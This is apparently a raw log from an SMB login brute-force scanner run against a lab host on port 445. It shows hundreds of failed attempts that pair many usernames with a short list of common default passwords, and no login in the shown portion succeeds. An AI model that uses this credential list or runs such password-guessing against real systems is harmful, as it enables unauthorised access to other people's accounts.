[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\clairehay:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\craigmcd:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danaros:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\danielletho:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\darrellpea:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donbur:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\donper:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednahow:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednaper:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ednarey:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\eugenewoo:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\fernandohun:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\flennrod:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\floydpet:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:12345',
